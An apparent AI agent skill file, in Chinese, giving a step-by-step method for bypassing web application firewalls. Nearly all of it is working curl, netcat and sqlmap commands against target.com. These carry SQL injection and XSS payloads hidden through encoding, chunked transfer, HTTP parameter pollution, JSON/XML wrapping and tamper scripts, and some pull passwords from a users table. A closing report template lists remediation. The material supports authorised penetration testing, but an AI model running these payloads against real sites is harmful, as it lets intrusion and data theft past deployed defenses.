---
name: cszh-performing-web-application-firewall-bypass
description: 使用编码技术、HTTP 方法操控、参数污染和载荷混淆绕过 Web 应用防火墙保护，将 SQL 注入、XSS 及其他攻击载荷穿透 WAF 检测规则。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 performing-web-application-firewall-bypass），正文按中文原文照录。

**这个技能干什么**：使用编码技术、HTTP 方法操控、参数污染和载荷混淆绕过 Web 应用防火墙保护，将 SQL 注入、XSS 及其他攻击载荷穿透 WAF 检测规则。

**什么时候用**：需要按上游中文方法论执行「performing-web-application-firewall-bypass」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 执行 Web 应用防火墙绕过（Performing Web Application Firewall Bypass）

## 适用场景
- 当已确认的漏洞被 WAF 基于签名的检测所拦截时
- 在渗透测试中 WAF 阻止了对已知问题的利用时
- 评估 WAF 规则对抗逃逸技术的有效性时
- 在需要绕过外围安全控制的红队演习期间
- 测试自定义 WAF 规则的完整性和抗绕过能力时

## 前置条件
- Burp Suite Professional（集成 SQLMap）
- wafw00f（用于 WAF 指纹识别）
- SQLMap（配合 tamper 脚本实现自动化 WAF 绕过）
- 了解 WAF 检测机制（签名、正则、行为分析）
- 针对各攻击类型的编码和混淆技术集合
- 熟悉可用于逃逸的 HTTP 协议细节

## 工作流程

### 步骤 1 — 识别和指纹识别 WAF
```bash
# 使用 wafw00f 检测 WAF
wafw00f http://target.com

# 通过响应头手动检测 WAF
curl -sI http://target.com | grep -iE "x-cdn|server|x-powered-by|x-sucuri|cf-ray|x-akamai"

# 使用已知恶意载荷触发 WAF 并分析响应
curl "http://target.com/page?id=1' OR 1=1--" -v
# 关注：403 Forbidden、自定义拦截页面、CAPTCHA 验证

# 常见 WAF 标识：
# Cloudflare：cf-ray 头、__cfduid cookie
# AWS WAF：x-amzn-requestid
# ModSecurity：Mod_Security 或 OWASP CRS 错误信息
# Akamai：AkamaiGHost 头
# Imperva：incap_ses cookie、visid_incap cookie
```

### 步骤 2 — 使用编码和混淆绕过
```bash
# URL 编码绕过
curl "http://target.com/page?id=1%27%20OR%201%3D1--"

# 双重 URL 编码
curl "http://target.com/page?id=1%2527%2520OR%25201%253D1--"

# Unicode 编码
curl "http://target.com/page?id=1%u0027%u0020OR%u00201%u003D1--"

# 请求体中使用 HTML 实体编码
curl -X POST http://target.com/search \
  -d "q=<script>alert&#40;1&#41;</script>"

# SQL 关键字大小写混合
curl "http://target.com/page?id=1' UnIoN SeLeCt password FrOm users--"

# SQL 关键字之间插入内联注释
curl "http://target.com/page?id=1'/*!UNION*//*!SELECT*/password/*!FROM*/users--"

# MySQL 版本特定注释
curl "http://target.com/page?id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"

# 空字节
curl "http://target.com/page?id=1'%00 OR 1=1--"

# 用制表符和换行符替代空格
curl "http://target.com/page?id=1'%09UNION%0ASELECT%0D1,2,3--"
```

### 步骤 3 — 使用 HTTP 方法和协议技巧绕过
```bash
# 更改 HTTP 方法（WAF 可能只检查 GET/POST）
curl -X PUT "http://target.com/page?id=1' OR 1=1--"
curl -X PATCH "http://target.com/page" -d "id=1' OR 1=1--"

# 使用 HTTP/0.9（无请求头）
printf "GET /page?id=1' OR 1=1-- \r\n" | nc target.com 80

# Content-Type 操控
curl -X POST http://target.com/page \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  -d "id=1' OR 1=1--"

# Multipart 表单数据（可能绕过请求体检查）
curl -X POST http://target.com/page \
  -F "id=1' OR 1=1--"

# 分块传输编码（Chunked Transfer-Encoding）
printf "POST /page HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nid=1\r\n11\r\n' OR 1=1--\r\n0\r\n\r\n" | nc target.com 80

# 在非常规位置传递参数
curl http://target.com/page -H "X-Forwarded-For: 1' OR 1=1--"
curl http://target.com/page -H "Referer: http://target.com/page?id=1' OR 1=1--"
```

### 步骤 4 — 使用载荷分割和 HPP 绕过
```bash
# HTTP 参数污染
curl "http://target.com/page?id=1' UNION&id=SELECT password FROM users--"

# 跨参数分割载荷
curl "http://target.com/page?id=1'/*&q=*/UNION SELECT 1,2,3--"

# 基于 JSON 的 SQLi（许多 WAF 忽略 JSON 载荷）
curl -X POST http://target.com/api/query \
  -H "Content-Type: application/json" \
  -d '{"id": "1 AND 1=1 UNION SELECT password FROM users"}'

# 带运算符的 JSON SQL 注入
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": {"$gt":"", "$where":"1==1"}}'

# XML 包装载荷
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d "<data><id>1' UNION SELECT password FROM users--</id></data>"
```

### 步骤 5 — 使用 SQLMap Tamper 脚本
```bash
# SQLMap 配合内置 tamper 脚本
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase,space2comment

# 常用 WAF 绕过 tamper 脚本：
sqlmap -u "http://target.com/page?id=1" --tamper=charunicodeencode
sqlmap -u "http://target.com/page?id=1" --tamper=space2mssqlhash
sqlmap -u "http://target.com/page?id=1" --tamper=percentage
sqlmap -u "http://target.com/page?id=1" --tamper=chardoubleencode,between

# 组合多个 tamper 脚本
sqlmap -u "http://target.com/page?id=1" \
  --tamper=randomcase,space2comment,between,charunicodeencode \
  --random-agent --level 5 --risk 3

# 自定义 WAF 绕过配置
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,randomcase \
  --delay=2 --random-agent \
  --technique=B --batch
```

### 步骤 6 — XSS WAF 绕过技术
```bash
# 大小写变体
curl "http://target.com/page?q=<ScRiPt>alert(1)</ScRiPt>"

# 替代事件处理器
curl "http://target.com/page?q=<img src=x oNerRor=alert(1)>"
curl "http://target.com/page?q=<svg/onload=alert(1)>"
curl "http://target.com/page?q=<body onpageshow=alert(1)>"
curl "http://target.com/page?q=<marquee onstart=alert(1)>"

# JavaScript URI 方案
curl "http://target.com/page?q=<a href=javascript:alert(1)>click</a>"

# 模板字面量语法
curl "http://target.com/page?q=<script>alert\x601\x60</script>"

# 基于字符串拼接的绕过
curl "http://target.com/page?q=<script>al\u0065rt(1)</script>"

# 属性内使用 HTML 编码
curl "http://target.com/page?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"

# 双重编码
curl "http://target.com/page?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"
```

## 核心概念

| 概念 | 定义 |
|---------|-------------|
| 签名逃逸（Signature Evasion） | 混淆载荷以避免匹配 WAF 正则规则 |
| 编码绕过（Encoding Bypass） | 使用 URL、Unicode 或 HTML 编码伪装恶意字符 |
| 协议级绕过（Protocol-Level Bypass） | 利用 HTTP 协议特性（分块编码、方法覆盖） |
| Tamper 脚本（Tamper Scripts） | SQLMap 模块，用于变换载荷以规避特定 WAF 规则 |
| Content-Type 混淆（Content-Type Confusion） | 以 WAF 未检查的非预期内容类型发送载荷 |
| 参数污染（Parameter Pollution） | 将载荷拆分到重复参数中以规避单参数检查 |
| 行为检测 vs 签名检测（Behavioral vs Signature） | WAF 检测模式：模式匹配（可绕过）vs 异常检测（更难绕过） |

## 工具与系统

| 工具 | 用途 |
|------|---------|
| wafw00f | WAF 指纹识别 |
| SQLMap | 自动化 SQL 注入，配合 WAF 绕过 tamper 脚本 |
| waf-bypass.com | 社区维护的 WAF 绕过载荷数据库 |
| Awesome-WAF | WAF 绕过技术整理的 GitHub 仓库 |
| Burp Suite | HTTP 代理，用于手工构造载荷和分析 WAF 响应 |
| XSStrike | 具备 WAF 检测和绕过能力的 XSS 扫描器 |

## 常见场景

1. **通过 JSON 注入 SQLi** — 在 JSON 请求体中发送 SQL 注入载荷，绕过未检查 JSON 的 WAF 规则
2. **通过事件处理器执行 XSS** — 使用 WAF 签名规则未覆盖的替代 HTML 事件处理器（onpageshow、onanimationstart）
3. **编码链绕过** — 叠加多层编码（URL + Unicode + HTML 实体）以逃过 WAF 的每一层解码
4. **分块传输绕过** — 将恶意载荷分散到 HTTP 分块传输编码的各个片段中，规避模式匹配
5. **方法覆盖** — 通过 WAF 不检查的 PUT/PATCH 方法或自定义请求头发送攻击载荷

## 输出格式

```
## WAF 绕过评估报告
- **目标**：http://target.com
- **识别的 WAF**：Cloudflare（via cf-ray header）
- **已实现绕过**：是

### WAF 检测结果
| 载荷类型 | 是否被拦截 | 是否找到绕过 |
|-------------|---------|-------------|
| 基础 SQLi | 是 | 是（JSON 编码） |
| UNION SELECT | 是 | 是（内联注释） |
| XSS <script> | 是 | 是（SVG onload） |
| 路径遍历 | 否 | 不适用（未被拦截） |

### 成功绕过载荷
| # | 原始载荷（被拦截） | 绕过载荷 | 技术 |
|---|-------------------|---------------|-----------|
| 1 | 1' OR 1=1-- | {"id":"1' OR 1=1--"} | JSON content-type |
| 2 | UNION SELECT | /*!50000UNION*/ /*!50000SELECT*/ | MySQL 版本注释 |
| 3 | <script>alert(1)</script> | <svg/onload=alert(1)> | 替代标签+事件处理器 |

### 修复建议
- 在 WAF 规则中启用 JSON 请求体检查
- 在签名检测基础上实施行为分析
- 增加对非常见 HTML 标签和事件处理器的规则
- 对所有 HTTP 方法启用深度内容检查
- 在规则评估前实施请求规范化处理
```
